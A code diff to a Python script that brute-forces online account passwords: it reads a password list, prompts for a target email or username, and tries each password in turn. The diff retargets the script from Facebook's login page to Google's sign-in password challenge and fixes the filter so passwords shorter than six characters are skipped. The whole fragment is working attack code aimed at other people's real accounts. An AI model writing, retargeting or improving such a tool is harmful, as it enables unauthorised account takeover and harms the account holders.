@@ -10,7 +10,7 @@ if sys.version_info[0] != 3:
 
 PASSWORD_FILE = "passwords.txt"
 MIN_PASSWORD_LENGTH = 6
-POST_URL = 'https://www.facebook.com/login.php'
+POST_URL = 'https://accounts.google.com/signin/v2/challenge/pwd'
 HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
@@ -55,7 +55,7 @@ if __name__ == "__main__":
     email = input('Enter Email/Username to target: ').strip()
     for index, password in zip(range(password_data.__len__()), password_data):
         password = password.strip()
-        if len(password) == MIN_PASSWORD_LENGTH:
+        if len(password) < MIN_PASSWORD_LENGTH:
             continue
         print("Trying password [", index, "]: ", password)
         if is_this_a_password(email, index, password):
